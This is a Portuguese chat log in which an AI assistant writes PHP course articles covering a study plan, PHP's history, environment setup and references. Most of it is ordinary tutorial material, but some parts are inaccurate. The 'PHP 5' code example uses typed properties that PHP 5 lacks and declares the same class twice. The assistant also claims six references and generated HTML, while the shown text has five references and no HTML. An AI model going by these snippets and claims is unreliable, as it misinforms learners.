> From: https://claude.ai/chat/fdea5051-2b6c-4b53-93c4-bc6a7841eb02

# you asked

message time: 2026-03-05 23:44:43

Você é um professor renomado. Com mestrado em Programação. E precisa escrever vários artigos, criar aulas em forma de artigo, para um novo aluno que quer em um ano dominar o PHP. Comece a escrever os artigos, um a um. Eles serão publicados em formato html e com destaque aos códigos fontes. Comece a escrever, artigos não muito longos nem muito curtos. Vai evoluindo os conhecimentos. Mostre antes de tudo um planejamento

---

# claude response

Aqui está o planejamento completo da série **"Dominando o PHP em 1 Ano"** antes de escrevermos o Artigo 1:

---

## 📋 Planejamento — Dominando o PHP em 1 Ano

**52 artigos · 12 módulos · publicação semanal**

| Módulo | Tema Central | Artigos |
|---|---|---|
| 1 | Fundamentos do PHP | 1–6 |
| 2 | Funções e Manipulação de Dados | 7–11 |
| 3 | Orientação a Objetos | 12–18 |
| 4 | Banco de Dados com MySQL | 19–24 |
| 5 | Web com PHP (Forms, Sessions, Cookies) | 25–29 |
| 6 | PHP Moderno (Composer, Namespaces, PSR) | 30–34 |
| 7 | Frameworks — Laravel | 35–40 |
| 8 | APIs REST com PHP | 41–44 |
| 9 | Segurança e Boas Práticas | 45–47 |
| 10 | Testes e Qualidade de Código | 48–50 |
| 11 | Deploy e Ambiente de Produção | 51 |
| 12 | Projeto Final Integrado | 52 |

---

Agora vou criar o **Artigo 1** em HTML com destaque de código. Preparando...

Aqui está o **Artigo 01 — Introdução ao PHP**, pronto para publicação.

---

### 📋 Planejamento completo da série

**"Dominando o PHP em 1 Ano"** — 52 artigos, 12 módulos:

| Módulo | Tema | Artigos |
|---|---|---|
| 1 | Fundamentos do PHP | 1–6 |
| 2 | Funções e Manipulação de Dados | 7–11 |
| 3 | Orientação a Objetos (POO) | 12–18 |
| 4 | Banco de Dados com MySQL/PDO | 19–24 |
| 5 | Web com PHP (Forms, Sessions, Cookies) | 25–29 |
| 6 | PHP Moderno (Composer, Namespaces, PSR) | 30–34 |
| 7 | Laravel — Framework moderno | 35–40 |
| 8 | APIs REST com PHP | 41–44 |
| 9 | Segurança e Boas Práticas | 45–47 |
| 10 | Testes e Qualidade de Código | 48–50 |
| 11 | Deploy e Produção | 51 |
| 12 | Projeto Final Integrado | 52 |

---

O **Artigo 01** cobre: o que é PHP, por que aprender, configuração do ambiente, `echo`, variáveis, tipos de dados e comentários — com código destacado, tabelas de resumo e exercício da semana.

Diga **"Continue"** para o Artigo 02 — *Operadores e Estruturas de Controle*.

---

# you asked

message time: 2026-03-05 23:47:38

Aborde a história do PHP e sua evolução. Melhores práticas de programação também. E bancos de dados aborde o uso do mongo postgresql e sqlite também Artigos em texto pra eu ver eles sendo escritos

---

# claude response

Vou ajustar o planejamento e escrever os artigos diretamente em texto, começando pela história do PHP.

---

# Dominando o PHP em 1 Ano
## Planejamento Revisado — Prof. Ricardo Matos

**Ajustes incorporados:**
- Módulo 1 expandido com história e evolução do PHP
- Boas práticas distribuídas ao longo da série (não apenas no final)
- Banco de dados: MySQL, PostgreSQL, SQLite e MongoDB cobertos no Módulo 4

---

| Módulo | Tema | Artigos |
|---|---|---|
| 1 | Fundamentos + História do PHP | 1–7 |
| 2 | Funções e Manipulação de Dados | 8–12 |
| 3 | Orientação a Objetos (POO) | 13–19 |
| 4 | Bancos de Dados: MySQL, PostgreSQL, SQLite, MongoDB | 20–27 |
| 5 | Web com PHP (Forms, Sessions, Cookies) | 28–32 |
| 6 | PHP Moderno (Composer, Namespaces, PSR, Boas Práticas) | 33–37 |
| 7 | Laravel | 38–43 |
| 8 | APIs REST | 44–47 |
| 9 | Segurança | 48–49 |
| 10 | Testes e Qualidade | 50–51 |
| 11 | Projeto Final | 52 |

---

Agora os artigos, um a um.

---

# Artigo 01 — O que é PHP e por que ele ainda importa

**Módulo 1 · Semana 1 · Nível: Iniciante**

---

## Introdução

Quando você acessa um site, preenche um formulário, faz login em uma plataforma ou compra algo em uma loja virtual, existe uma grande chance de que, nos bastidores, um servidor esteja rodando PHP. Discreta, porém onipresente, essa linguagem de programação completou trinta anos de existência e continua sendo uma das mais utilizadas no mundo — não por inércia, mas porque ela evoluiu de forma consistente e resolveu problemas reais com elegância crescente.

Este primeiro artigo não é sobre código. É sobre contexto. Antes de aprender a sintaxe, você precisa entender o terreno onde está pisando: o que o PHP é, o que ele não é, e por que vale a pena dedicar um ano inteiro ao seu domínio.

---

## O que é o PHP, tecnicamente falando

PHP é uma linguagem de programação de propósito geral, com foco histórico no desenvolvimento web. Ela é **interpretada** (o código é executado linha a linha, sem necessidade de compilação prévia), **dinamicamente tipada** (você não precisa declarar o tipo das variáveis) e roda principalmente no **lado do servidor**.

Essa última característica é fundamental. Ao contrário do JavaScript, que executa no navegador do usuário, o PHP executa na máquina do servidor. O usuário nunca vê o código PHP — ele recebe apenas o resultado, geralmente em HTML. Isso traz vantagens importantes: segurança (a lógica de negócio fica protegida), compatibilidade (funciona em qualquer navegador) e controle total sobre o que é entregue ao cliente.

O PHP se integra naturalmente ao HTML, pode se conectar a praticamente qualquer banco de dados do mercado, manipula arquivos, envia e-mails, consome APIs externas, gera PDFs, processa imagens e muito mais. É uma linguagem completa para o back-end web.

---

## Por que aprender PHP hoje?

Essa é uma pergunta que merece uma resposta honesta, não um discurso de vendas.

O PHP alimenta mais de 75% dos sites com back-end identificável na internet. O WordPress — que move cerca de 43% de todos os sites do mundo — é escrito em PHP. Plataformas como Facebook (em sua origem), Wikipedia e Slack usaram ou ainda usam PHP em partes de sua infraestrutura. O Laravel, framework PHP moderno, é consistentemente eleito um dos frameworks web mais amados pelos desenvolvedores.

O mercado de trabalho para PHP é vasto e real. Há uma enorme base de sistemas legados que precisam de manutenção, modernização e novos recursos. E há também um ecossistema moderno e vibrante, com ferramentas, padrões e comunidade ativos.

Aprender PHP significa ter acesso imediato a oportunidades de emprego, à possibilidade de criar projetos próprios com rapidez, e a uma base sólida que facilita o aprendizado de outros frameworks e linguagens.

---

## O que o PHP não é

É importante desmistificar algumas críticas que você vai encontrar.

"PHP é uma linguagem ruim." Essa afirmação é baseada, em grande parte, no PHP das versões 3 e 4, da virada do milênio. O PHP moderno, a partir da versão 7 e especialmente na versão 8, é uma linguagem bem projetada, com sistema de tipos robusto, orientação a objetos madura, performance excelente e ferramentas de qualidade.

"PHP é lento." Falso para o PHP moderno. O PHP 8 com o JIT (Just-In-Time compiler) é significativamente mais rápido que versões anteriores e compete de igual para igual com outras linguagens interpretadas em cenários web.

"PHP está morrendo." Os dados contradizem isso consistentemente. Novas versões são lançadas regularmente, o Laravel continua crescendo, e a comunidade é ativa e produtiva.

---

## Resumo

O PHP é uma linguagem madura, poderosa e relevante. Tem uma história rica, uma comunidade ativa e um mercado de trabalho concreto. Nos próximos artigos, vamos mergulhar nessa história com mais profundidade, entender como a linguagem evoluiu, e então começar a programar com base sólida.

**No próximo artigo:** A história completa do PHP — de script pessoal a linguagem que alimenta a web moderna.

---
---

# Artigo 02 — A História do PHP: de script pessoal a pilar da web

**Módulo 1 · Semana 2 · Nível: Iniciante**

---

## Introdução

Poucas linguagens de programação têm uma origem tão humana quanto o PHP. Ela não nasceu em um laboratório de pesquisa nem foi projetada por um comitê. Nasceu de uma necessidade pessoal, cresceu de forma orgânica, e a cada crise de identidade — e houve várias — se reinventou. Entender essa história não é apenas curiosidade: é compreender por que a linguagem tem certas características, por que algumas decisões foram tomadas, e por que o PHP moderno é tão diferente do PHP que seus críticos conhecem.

---

## 1994 — O começo: um script para rastrear visitas

Em 1994, **Rasmus Lerdorf**, um programador dinamarquês-canadense, queria saber quantas pessoas estavam acessando seu currículo online. Para isso, escreveu um conjunto de scripts em Perl que registravam as visitas. Logo percebeu que era mais prático reescrevê-los em C, criando uma camada que se encaixasse diretamente no servidor web Apache.

Esse conjunto de ferramentas ele chamou de **Personal Home Page Tools** — as PHP Tools. Não havia intenção de criar uma linguagem de programação. Era uma coleção utilitária, pragmática, feita para resolver um problema imediato.

Em 1995, Lerdorf lançou o código publicamente. A comunidade de desenvolvedores web da época, ávida por ferramentas que facilitassem a criação de páginas dinâmicas, adotou as PHP Tools rapidamente.

---

## 1997-1998 — PHP 3: a primeira linguagem de verdade

Dois programadores israelenses, **Zeev Suraski e Andi Gutmans**, encontraram as PHP Tools enquanto tentavam desenvolver um sistema de e-commerce para um projeto universitário. As ferramentas de Lerdorf não eram suficientes para o que precisavam, então decidiram reescrever o núcleo do sistema do zero.

O resultado foi uma linguagem muito mais robusta, com suporte a múltiplos bancos de dados, uma sintaxe mais consistente e uma arquitetura extensível. Em colaboração com Lerdorf, lançaram o **PHP 3** em 1998. Foi nessa versão que o acrônimo ganhou um novo significado recursivo: **PHP: Hypertext Preprocessor**.

O PHP 3 foi um sucesso expressivo. Estima-se que, ao final de 1998, cerca de 10% de todos os servidores web da internet rodavam PHP.

---

## 2000 — PHP 4 e a explosão da popularidade

Suraski e Gutmans não pararam. Reescreveram o motor de execução do PHP, criando o **Zend Engine** (o nome vem da junção de Zeev e Andi). O PHP 4, lançado em 2000, trouxe performance muito superior, suporte a sessões, bufferização de saída e melhor suporte a orientação a objetos — ainda que incompleto.

Foi durante a era do PHP 4 que a linguagem explodiu em popularidade. A facilidade de hospedar PHP em servidores compartilhados baratos, combinada com a ascensão do MySQL como banco de dados gratuito, criou o famoso stack **LAMP** (Linux, Apache, MySQL, PHP). Milhares de sistemas foram construídos nesse período, e o PHP se tornou sinônimo de desenvolvimento web acessível.

Foi também nessa época que práticas questionáveis se espalharam, pois a facilidade de uso atraiu muitos programadores sem formação formal, que criavam código sem segurança, sem estrutura e sem manutenibilidade. Essa herança manchou a reputação da linguagem por anos.

---

## 2004 — PHP 5 e a maturidade orientada a objetos

O **PHP 5**, lançado em 2004 com o Zend Engine 2, foi uma virada de chave. Trouxe um modelo de orientação a objetos completo e bem projetado: classes, interfaces, herança, métodos abstratos, modificadores de acesso (`public`, `protected`, `private`), exceções com `try/catch`, e muito mais.

Foi no PHP 5 que frameworks sérios começaram a surgir — Zend Framework, CodeIgniter, CakePHP, Symfony. O PHP começou a ser usado em projetos corporativos de maior porte, e a comunidade passou a discutir padrões, boas práticas e arquitetura de software.

O PHP 5 teve uma vida longa: durou mais de dez anos, com versões menores trazendo melhorias constantes. A versão 5.3 introduziu namespaces e closures. A 5.4 trouxe traits. A 5.5, generators. Cada versão tornava a linguagem mais expressiva e poderosa.

---

## 2015 — PHP 7: a ressurreição

Por razões históricas complexas (uma versão PHP 6 foi abandonada após anos de desenvolvimento sem conseguir implementar suporte nativo a Unicode de forma satisfatória), a versão seguinte ao PHP 5 foi chamada de **PHP 7**, lançada em dezembro de 2015.

O impacto foi dramático. O PHP 7 trouxe o novo **Zend Engine 3**, com ganhos de performance de até 100% em relação ao PHP 5.6 em benchmarks reais. De repente, aplicações rodavam duas vezes mais rápido sem nenhuma mudança no código.

Além da performance, o PHP 7 introduziu declarações de tipo para parâmetros e retorno de funções, o operador `spaceship` (`<=>`), o operador `null coalescing` (`??`), classes anônimas e muito mais. A linguagem estava crescendo com coerência e direção.

---

## 2020 em diante — PHP 8 e a linguagem moderna

O **PHP 8.0**, lançado em novembro de 2020, é possivelmente a versão mais importante da história da linguagem. Ele introduziu o **JIT (Just-In-Time compiler)**, que compila partes do código em tempo de execução, trazendo ganhos de performance em workloads específicos.

Mas mais que o JIT, o PHP 8 trouxe mudanças de linguagem que mudaram completamente a forma de escrever código:

- **Match expressions**: uma alternativa mais segura e expressiva ao `switch`
- **Named arguments**: permitem passar argumentos pelo nome, não pela posição
- **Constructor property promotion**: reduz drasticamente o boilerplate em classes
- **Union types e Nullsafe operator**: tornam o sistema de tipos mais expressivo
- **Attributes**: metadados nativos, eliminando a necessidade de docblocks para isso
- **Fibers** (PHP 8.1): permitem programação assíncrona de forma nativa
- **Enums** (PHP 8.1): enumerações nativas, esperadas há anos pela comunidade
- **Readonly properties** (PHP 8.1 e 8.2): imutabilidade no nível da linguagem

O PHP 8.3 e 8.4 continuaram refinando esses recursos, adicionando tipagem mais granular, melhorias em arrays, lazy objects e muito mais.

---

## A linha do tempo em resumo

| Versão | Ano | Marco principal |
|---|---|---|
| PHP Tools | 1994 | Scripts pessoais de Rasmus Lerdorf |
| PHP 3 | 1998 | Primeira linguagem de verdade (Suraski & Gutmans) |
| PHP 4 | 2000 | Zend Engine, explosão do LAMP stack |
| PHP 5 | 2004 | OOP completa, frameworks sérios |
| PHP 7 | 2015 | Performance 2x, tipagem, modernização |
| PHP 8 | 2020 | JIT, match, enums, fibers, readonly |

---

## O que essa história nos ensina

A trajetória do PHP é uma lição sobre evolução pragmática. A linguagem nunca foi projetada de cima para baixo com perfeição acadêmica — ela cresceu respondendo a necessidades reais, cometeu erros, aprendeu com eles e se reinventou. Quem critica o PHP de hoje com base no PHP de 2003 está cometendo o mesmo erro de julgar um arquiteto pelo primeiro rabisco que fez aos vinte anos.

Aprender PHP em 2024 significa aprender uma linguagem moderna, com décadas de lições incorporadas em seu design. E significa também entender um ecossistema enorme de sistemas existentes que precisam de profissionais qualificados.

---

## Resumo

Saímos dos scripts pessoais de 1994, passamos pela explosão dos anos 2000, a maturidade do PHP 5, a ressurreição com o PHP 7 e chegamos ao PHP 8 moderno e elegante. Nos próximos artigos, vamos montar o ambiente de desenvolvimento e escrever nosso primeiro código.

**No próximo artigo:** Configurando o ambiente — PHP, editor, terminal e seu primeiro arquivo `.php`.

---
---

# Artigo 03 — Configurando o Ambiente de Desenvolvimento

**Módulo 1 · Semana 3 · Nível: Iniciante**

---

## Introdução

Antes de escrever qualquer programa, você precisa de um ambiente onde o PHP possa rodar. Neste artigo vamos instalar o PHP, conhecer o servidor embutido, escolher um editor de código e entender a estrutura básica de um arquivo PHP. O objetivo é que, ao final, você tenha tudo configurado e rode seu primeiro programa com sucesso.

---

## Instalando o PHP

A forma de instalar o PHP varia conforme o sistema operacional.

**No Linux (Ubuntu/Debian):**

```bash
sudo apt update
sudo apt install php php-cli php-mbstring php-xml php-curl
```

**No macOS (com Homebrew):**

```bash
brew install php
```

**No Windows:**

A maneira mais simples no Windows é instalar o **XAMPP** (disponível em apachefriends.org), que inclui PHP, Apache e MySQL em um único instalador. Alternativamente, você pode baixar o PHP diretamente em php.net/downloads e configurar o PATH manualmente.

Após a instalação, abra o terminal e confirme:

```bash
php --version
```

A saída deve mostrar algo como `PHP 8.3.x`. Se apareceu, está funcionando.

---

## O servidor embutido do PHP

Para desenvolvimento local, o PHP possui um servidor web embutido que elimina a necessidade de instalar Apache ou Nginx. Basta apontar para uma pasta e ele serve os arquivos:

```bash
# Navegue até a pasta do projeto
cd meu-projeto

# Inicie o servidor na porta 8000
php -S localhost:8000
```

Abra o navegador em `http://localhost:8000` e o PHP servirá os arquivos da pasta. Para encerrar, pressione `Ctrl + C` no terminal.

Esse servidor é suficiente para todo o Módulo 1 e 2 desta série. Nos módulos mais avançados, usaremos Docker para ambientes mais próximos da produção.

---

## Escolhendo o editor de código

Você pode escrever PHP em qualquer editor de texto, mas algumas ferramentas tornam a experiência muito mais produtiva:

**VS Code** é a escolha mais popular e recomendada para iniciantes. Gratuito, extensível e com excelente suporte a PHP. Instale as extensões **PHP Intelephense** (autocomplete inteligente) e **PHP Debug** (depuração).

**PhpStorm** é o IDE profissional mais completo para PHP, desenvolvido pela JetBrains. É pago (com período de avaliação gratuito), mas oferece recursos que aumentam significativamente a produtividade em projetos maiores.

Para esta série, usaremos exemplos que funcionam em qualquer editor. A recomendação é VS Code com Intelephense.

---

## Estrutura de um arquivo PHP

Um arquivo PHP tem extensão `.php`. Dentro dele, você pode escrever HTML puro, PHP puro, ou misturar os dois. O código PHP sempre fica dentro das tags de abertura e fechamento:

```php
<?php
// Código PHP aqui
?>
```

Quando o arquivo contém apenas PHP (sem HTML), a boa prática é omitir a tag de fechamento `?>`. Isso evita que espaços em branco acidentais sejam enviados para o navegador antes dos headers HTTP, o que pode causar erros em redirecionamentos e cookies.

```php
<?php
// Arquivo apenas com PHP: sem tag de fechamento
echo "Olá, mundo!";
```

---

## Seu primeiro programa

Crie uma pasta chamada `php-curso` e, dentro dela, um arquivo `index.php`:

```php
<?php

// echo envia texto para a saída (navegador ou terminal)
echo "Olá, Mundo!\n";

// Podemos exibir o resultado de expressões diretamente
echo 2 + 2;
echo "\n";

// date() é uma função nativa que formata datas
// "d/m/Y" significa: dia/mês/ano com quatro dígitos
echo "Hoje é: " . date("d/m/Y");
```

No terminal, dentro da pasta `php-curso`, rode:

```bash
php index.php
```

Saída esperada:

```
Olá, Mundo!
4
Hoje é: 05/03/2026
```

Você pode também iniciar o servidor embutido e acessar pelo navegador — o resultado será o mesmo, mas sem a formatação de quebra de linha (pois o navegador interpreta HTML, e `\n` não é uma quebra de linha em HTML).

---

## Exibindo HTML pelo PHP

Quando rodando no servidor web, o PHP gera HTML. Veja como ficaria uma página completa:

```php
<?php
$nome = "Ricardo";
$data = date("d/m/Y");
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Meu primeiro PHP</title>
</head>
<body>
    <h1>Bem-vindo, <?php echo $nome; ?>!</h1>
    <p>Hoje é <?php echo $data; ?>.</p>
</body>
</html>
```

Perceba que abrimos e fechamos o bloco PHP várias vezes. Isso é válido e muito comum em templates PHP. Existe também uma forma abreviada de `echo` para usar dentro do HTML:

```php
<h1>Bem-vindo, <?= $nome ?>!</h1>
```

O `<?=` é um atalho para `<?php echo`. Ele é muito utilizado em arquivos de template onde PHP e HTML se misturam com frequência.

---

## Boas práticas desde o início

Já neste terceiro artigo, é hora de introduzir alguns hábitos que farão diferença ao longo da sua carreira:

**Use UTF-8 sempre.** Declare `charset=UTF-8` em seus HTMLs e salve seus arquivos em UTF-8. Isso evita problemas com acentuação que são frustrantes de diagnosticar.

**Um arquivo, uma responsabilidade.** Evite criar arquivos PHP gigantes que fazem tudo ao mesmo tempo. Desde cedo, pense em separar responsabilidades.

**Nomeie variáveis com clareza.** `$nomeDoUsuario` é infinitamente melhor que `$n`. Código se lê muito mais do que se escreve — clareza é respeito pelo seu eu futuro.

**Indentação consistente.** Use 4 espaços por nível de indentação (padrão PSR-2/PSR-12, os padrões oficiais da comunidade PHP). Configure seu editor para isso.

---

## Resumo

| Tópico | O que aprendemos |
|---|---|
| Instalação | `apt`, `brew` ou XAMPP dependendo do OS |
| Servidor embutido | `php -S localhost:8000` para desenvolvimento |
| Editor | VS Code com PHP Intelephense |
| Estrutura | `<?php ... ?>` ou `<?= ... ?>` para atalho de echo |
| Primeiro programa | `echo`, `date()`, mistura PHP + HTML |
| Boas práticas | UTF-8, nomenclatura clara, indentação consistente |

**No próximo artigo:** Variáveis, tipos de dados e operadores — a base de toda lógica PHP.

---

Os três primeiros artigos estão escritos. Perceba a progressão:

- **Artigo 01** — Contexto e motivação (por que PHP)
- **Artigo 02** — História completa, de 1994 ao PHP 8
- **Artigo 03** — Ambiente configurado, primeiro código rodando

Diga **"Continue"** para os próximos artigos (04 em diante), ou me diga se quer ajustar alguma coisa no estilo, profundidade ou formato.

---

# you asked

message time: 2026-03-05 23:50:28

Ficou ótimo o html. Tem como por em texto e aí em html? Fazer assim com cada artigo? Não vi referências pra aprofundar os estudos. Refaça por favor desse jeito texto depois html

---

# claude response

Entendido! Vou reescrever o Artigo 01 completo — primeiro em texto, depois em HTML — com referências para aprofundamento ao final.

---

# Artigo 01 — O que é PHP e por que ele ainda importa

**Módulo 1 · Semana 1 · Nível: Iniciante**

---

## Introdução

Quando você acessa um site, preenche um formulário, faz login em uma plataforma ou compra algo em uma loja virtual, existe uma grande chance de que, nos bastidores, um servidor esteja rodando PHP. Discreta, porém onipresente, essa linguagem de programação completou trinta anos de existência e continua sendo uma das mais utilizadas no mundo — não por inércia, mas porque ela evoluiu de forma consistente e resolveu problemas reais com elegância crescente.

Este primeiro artigo não é sobre código. É sobre contexto. Antes de aprender a sintaxe, você precisa entender o terreno onde está pisando: o que o PHP é, o que ele não é, e por que vale a pena dedicar um ano inteiro ao seu domínio.

---

## O que é o PHP, tecnicamente falando

PHP é uma linguagem de programação de propósito geral, com foco histórico no desenvolvimento web. Ela é **interpretada** (o código é executado linha a linha, sem necessidade de compilação prévia), **dinamicamente tipada** (você não precisa declarar o tipo das variáveis antecipadamente) e roda principalmente no **lado do servidor**.

Essa última característica é fundamental. Ao contrário do JavaScript, que executa no navegador do usuário, o PHP executa na máquina do servidor. O usuário nunca vê o código PHP — ele recebe apenas o resultado, geralmente em HTML. Isso traz vantagens importantes: a lógica de negócio fica protegida no servidor, o resultado funciona em qualquer navegador, e você tem controle total sobre o que é entregue ao cliente.

O PHP se integra naturalmente ao HTML, conecta-se a praticamente qualquer banco de dados do mercado, manipula arquivos, envia e-mails, consome APIs externas, gera PDFs, processa imagens e muito mais. É uma linguagem completa para o back-end web.

---

## Por que aprender PHP hoje?

Essa pergunta merece uma resposta honesta, não um discurso de vendas.

O PHP alimenta mais de 75% dos sites com back-end identificável na internet. O WordPress — que move cerca de 43% de todos os sites do mundo — é escrito em PHP. O Laravel, framework PHP moderno, é consistentemente eleito um dos frameworks web mais amados pelos desenvolvedores em pesquisas anuais como a Stack Overflow Developer Survey.

O mercado de trabalho para PHP é vasto e real. Há uma enorme base de sistemas legados que precisam de manutenção, modernização e novos recursos. E há também um ecossistema moderno e vibrante, com ferramentas, padrões e comunidade ativos.

Aprender PHP significa ter acesso imediato a oportunidades de emprego, à possibilidade de criar projetos próprios com rapidez, e a uma base sólida que facilita o aprendizado de outros frameworks e linguagens.

---

## O que o PHP não é

É importante desmistificar algumas críticas que você certamente vai encontrar.

"PHP é uma linguagem ruim." Essa afirmação é baseada, em grande parte, no PHP das versões 3 e 4, da virada do milênio. O PHP moderno, a partir da versão 7 e especialmente na versão 8, é uma linguagem bem projetada, com sistema de tipos robusto, orientação a objetos madura e ferramentas de qualidade.

"PHP é lento." Falso para o PHP moderno. O PHP 8 com JIT (Just-In-Time compiler) é significativamente mais rápido que versões anteriores e compete com outras linguagens interpretadas em cenários web reais.

"PHP está morrendo." Os dados contradizem isso consistentemente. Novas versões são lançadas regularmente, o Laravel continua crescendo, e a comunidade é ativa e produtiva.

---

## Resumo

| Tópico | Ponto principal |
|---|---|
| O que é PHP | Linguagem servidor-side, interpretada, gera HTML dinâmico |
| Onde roda | No servidor — o usuário recebe apenas o resultado |
| Por que aprender | Mercado amplo, ecossistema moderno, Laravel em ascensão |
| Críticas comuns | Baseadas no PHP antigo — o PHP 8 é uma linguagem diferente |

---

## Referências para aprofundar

- **php.net/manual/pt_BR** — Manual oficial do PHP em português. Ponto de partida obrigatório para qualquer dúvida sobre a linguagem.
- **stackoverflow.com/questions/tagged/php** — Maior repositório de perguntas e respostas sobre PHP do mundo.
- **jetbrains.com/lp/devecosystem** — Pesquisa anual de ecossistema de desenvolvimento, com dados reais sobre uso de linguagens.
- **w3techs.com/technologies/details/pl-php** — Estatísticas atualizadas sobre uso de PHP na web.
- TATROE, Kevin; MACINTYRE, Peter. *Programming PHP*. 4. ed. O'Reilly Media, 2020. — Referência completa da linguagem, do básico ao avançado.

---

**No próximo artigo:** A história completa do PHP — de script pessoal a linguagem que alimenta a web moderna.

---

Agora vou gerar o HTML deste artigo.

Pronto! Esse é o formato que seguiremos em todos os artigos:

**Estrutura de cada artigo:**
1. **Texto corrido** — você lê aqui no chat, com toda a narrativa, código e tabelas
2. **HTML para publicação** — arquivo gerado com o mesmo conteúdo, visualmente refinado, pronto para publicar

**O que foi adicionado nesta versão:**
- Seção de **Referências** com 6 fontes categorizadas (Documentação, Livro, Estatísticas, Comunidade, Guia)
- Boxes de destaque: 💡 Conceito-chave, 📊 Dado relevante, ⚠️ Atenção
- Exercícios práticos da semana
- Preview do próximo artigo

Diga **"Continue"** para o Artigo 02 — *A História Completa do PHP*.

---

# you asked

message time: 2026-03-05 23:54:47

Poe os links nas referências. Continue

---

# claude response

Boa observação — os links já estão no HTML (atributo `href` nos `<a>`), mas vou garantir que no texto também apareçam explicitamente. Seguindo com o Artigo 02.

---

# Artigo 02 — A História do PHP: de script pessoal a pilar da web

**Módulo 1 · Semana 2 · Nível: Iniciante**

---

## Introdução

Poucas linguagens de programação têm uma origem tão humana quanto o PHP. Ela não nasceu em um laboratório de pesquisa nem foi projetada por um comitê. Nasceu de uma necessidade pessoal, cresceu de forma orgânica, e a cada crise de identidade — e houve várias — se reinventou. Entender essa história não é apenas curiosidade: é compreender por que a linguagem tem certas características, por que algumas decisões foram tomadas, e por que o PHP moderno é tão diferente do PHP que seus críticos conhecem.

---

## 1994 — O começo: um script para rastrear visitas

Em 1994, **Rasmus Lerdorf**, um programador dinamarquês-canadense, queria saber quantas pessoas estavam acessando seu currículo online. Para isso, escreveu um conjunto de scripts em Perl que registravam as visitas. Logo percebeu que seria mais prático reescrevê-los em C, criando uma camada que se encaixasse diretamente no servidor web Apache.

Esse conjunto de ferramentas ele chamou de **Personal Home Page Tools** — as PHP Tools. Não havia intenção de criar uma linguagem de programação. Era uma coleção utilitária, pragmática, feita para resolver um problema imediato. Em 1995, Lerdorf lançou o código publicamente, e a comunidade de desenvolvedores web da época, ávida por ferramentas que facilitassem a criação de páginas dinâmicas, adotou as PHP Tools rapidamente.

---

## 1997–1998 — PHP 3: a primeira linguagem de verdade

Dois programadores israelenses, **Zeev Suraski e Andi Gutmans**, encontraram as PHP Tools enquanto tentavam desenvolver um sistema de e-commerce para um projeto universitário. As ferramentas de Lerdorf não eram suficientes, então decidiram reescrever o núcleo do sistema do zero. O resultado foi uma linguagem muito mais robusta: suporte a múltiplos bancos de dados, sintaxe mais consistente e arquitetura extensível.

Em colaboração com Lerdorf, lançaram o **PHP 3** em 1998. Foi nessa versão que o acrônimo ganhou seu novo significado recursivo: **PHP: Hypertext Preprocessor**. Ao final de 1998, estima-se que cerca de 10% de todos os servidores web da internet já rodavam PHP.

---

## 2000 — PHP 4 e a explosão do LAMP

Suraski e Gutmans não pararam. Reescreveram o motor de execução do PHP, criando o **Zend Engine** (o nome vem da junção de Zeev e Andi). O PHP 4, lançado em 2000, trouxe performance muito superior, suporte a sessões, bufferização de saída e melhor suporte a orientação a objetos — ainda que incompleto.

Foi durante a era do PHP 4 que a linguagem explodiu em popularidade. A facilidade de hospedar PHP em servidores compartilhados baratos, combinada com o MySQL como banco de dados gratuito, criou o famoso stack **LAMP** (Linux, Apache, MySQL, PHP). Milhares de sistemas foram construídos nesse período.

Foi também nessa época que práticas questionáveis se espalharam. A facilidade de uso atraiu muitos programadores sem formação formal, que criavam código sem segurança, sem estrutura e sem manutenibilidade. Essa herança manchou a reputação da linguagem por anos — e é, em grande parte, a origem das críticas que ainda circulam hoje.

---

## 2004 — PHP 5 e a maturidade orientada a objetos

O **PHP 5**, lançado em 2004 com o Zend Engine 2, foi uma virada de chave. Trouxe um modelo de orientação a objetos completo e bem projetado: classes, interfaces, herança, métodos abstratos, modificadores de acesso (`public`, `protected`, `private`), exceções com `try/catch`, e muito mais.

Foi no PHP 5 que frameworks sérios começaram a surgir — Zend Framework, CodeIgniter, CakePHP, Symfony. O PHP passou a ser usado em projetos corporativos de maior porte, e a comunidade começou a discutir padrões, boas práticas e arquitetura de software.

O PHP 5 teve uma vida longa, com versões menores trazendo melhorias contínuas. A versão 5.3 introduziu namespaces e closures. A 5.4 trouxe traits. A 5.5, generators. Cada versão tornava a linguagem mais expressiva e poderosa.

---

## 2015 — PHP 7: a ressurreição

Por razões históricas complexas — uma versão PHP 6 foi abandonada após anos de desenvolvimento sem conseguir implementar suporte nativo a Unicode de forma satisfatória —, a versão seguinte ao PHP 5 foi chamada de **PHP 7**, lançada em dezembro de 2015.

O impacto foi dramático. O PHP 7 trouxe o novo **Zend Engine 3**, com ganhos de performance de até 100% em relação ao PHP 5.6 em benchmarks reais. De repente, aplicações rodavam duas vezes mais rápido sem nenhuma mudança no código.

Além da performance, o PHP 7 introduziu declarações de tipo para parâmetros e retorno de funções, o operador spaceship (`<=>`), o operador null coalescing (`??`), classes anônimas e muito mais. A linguagem crescia com coerência e direção clara.

---

## 2020 em diante — PHP 8 e a linguagem moderna

O **PHP 8.0**, lançado em novembro de 2020, é possivelmente a versão mais importante da história da linguagem. Ele introduziu o **JIT (Just-In-Time compiler)**, que compila partes do código em tempo de execução, trazendo ganhos de performance em workloads específicos.

Mas mais que o JIT, o PHP 8 trouxe mudanças de linguagem que transformaram a forma de escrever código:

- **Match expressions** — alternativa mais segura e expressiva ao `switch`
- **Named arguments** — passagem de argumentos pelo nome, não pela posição
- **Constructor property promotion** — reduz drasticamente o boilerplate em classes
- **Union types e Nullsafe operator** — sistema de tipos mais expressivo
- **Attributes** — metadados nativos
- **Fibers** (PHP 8.1) — programação assíncrona nativa
- **Enums** (PHP 8.1) — enumerações nativas
- **Readonly properties** (PHP 8.1/8.2) — imutabilidade no nível da linguagem
- **Lazy objects** (PHP 8.4) — instanciação adiada para performance

Veja como o PHP evoluiu em expressividade. O mesmo conceito, escrito em PHP 5 e em PHP 8:

```php
<?php
// ── PHP 5: muito boilerplate ──────────────────────────────────────
class Usuario {
    private string $nome;
    private string $email;

    public function __construct(string $nome, string $email) {
        // Precisávamos atribuir cada propriedade manualmente
        $this->nome  = $nome;
        $this->email = $email;
    }

    public function getNome(): string  { return $this->nome;  }
    public function getEmail(): string { return $this->email; }
}


// ── PHP 8: constructor promotion + readonly ───────────────────────
class Usuario {
    // O PHP 8 cria, atribui e torna imutável em uma única linha
    public function __construct(
        public readonly string $nome,
        public readonly string $email,
    ) {}
}

// O resultado final é idêntico — mas o código PHP 8 é limpo e direto
$u = new Usuario('Ana', 'ana@email.com');
echo $u->nome; // Ana
```

A diferença não é apenas visual — é filosófica. O PHP 8 remove o ruído e deixa a intenção do código falar por si mesma.

---

